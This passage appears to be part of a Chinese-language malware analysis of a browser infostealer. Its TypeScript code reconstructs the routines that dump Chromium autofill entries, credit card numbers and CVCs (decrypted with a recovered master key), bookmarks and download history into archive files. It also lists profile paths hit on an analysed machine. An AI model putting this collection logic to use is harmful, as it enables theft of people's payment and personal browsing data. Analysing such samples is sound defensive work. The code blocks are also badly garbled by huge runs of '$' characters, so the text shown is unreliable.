$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${profile.profileName}.txt`, text);   
        } catch {}   
      }   
    }
```

**5.3 Chromium 自动填充与信用卡**

**功能解析：**

1. 读取 Web Data

2. 导出自动填充字段值

3. 同类逻辑还会读取信用卡表和本 CVC 表并尝试解密

**运行结果：**

● 产生自动填充数据导出

● 产生信用卡号 / CVC 导出

**读取目标 / 请求目标：**

```
<Browser>\User Data\<Profile>\Web Data
```

**动态参数：**

● 关键动态表

○ autofill

○ credit\_cards

○ local\_stored\_cvc

● 关键动态依赖：

○ 浏览 profile 路径

○ 已恢复的 masterKey

**参数：**

● targets

○ 浏览器和 Web Data 路径

● queryAutofillRows

○ 查询自动填充

● appendArtifact

○ 写入归档

**代码：**

```
/**   
     * 查询 Web Data.autofill 表，导出自动填充项     
     */   
    async function collectChromiumAutofillData(targets: Array<{ browserName: string; webDataPath: string }>, deps) {   
      for (const target of targets) {   
        try {   
          //  Web Data  autofill 表中取自动填充条     
          const rows = await deps.queryAutofillRows(target.webDataPath);   
         
          // 输出 name / value / count，便于直接看用户保存过哪些表单内     
          const text = rows   
            .map((row) => `Name: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${row.name}\nValue: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${row.value}\nCount: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${row.count}`)   
            .join("\n\n");   
         
          // 写入 Autofills 归档目录   
          await deps.appendArtifact(`Autofills/$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${target.browserName}.txt`, text);   
        } catch {}   
      }   
    }
```

**5.4 书签与下载历史**

**功能解析：**

1. 解析书签 JSON

2. 读取下载历史

3. 把浏览器用户行为痕迹整理进归档

**运行结果：**

● 产生书签导出

● 产生下载历史导出

**读取目标 / 请求目标：**

```
    <Browser>\User Data\<Profile>\Bookmarks   
    <Browser>\User Data\<Profile>\History
```

**动态参数：**

● 已确认命中路径：

○ C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks

○ C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\History

● 关键动态记录：

○ 书签 roots

○ downloads 相关历史记录

**参数：**

● targets

○ 书签文件路径与历史数据库路径

● readJson

○ 读取 Bookmarks

● flattenBookmarks

○ 展平书签

● queryDownloadRows

○ 查询下载历史

● appendArtifact

○ 写入归档

**代码：**

```
/**   
     * 解析 Bookmarks JSON  History.downloads，分别导出书签与下载记录     
     */   
    async function collectChromiumBookmarksAndHistory(targets: Array<{ browserName: string; bookmarksPath: string; historyDbPath: string }>, deps) {   
      for (const target of targets) {   
        try {   
          // 书签保存 JSON 文件中，需要先展开 roots 树结     
          const bookmarkJson = await deps.readJson(target.bookmarksPath);   
          const bookmarks = deps.flattenBookmarks(bookmarkJson?.roots ?? {});   
          await deps.appendArtifact(`Bookmarks/$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${target.browserName}.txt`, bookmarks.join("\n"));   
        } catch {}   
         
        try {   
          // 下载历史来自 History SQLite  downloads 记录   
          const downloads = await deps.queryDownloadRows(target.historyDbPath);   
          const downloadText = downloads   
            .map((row) => `URL: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${row.tab_url ?? row.current_path}\nTarget: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$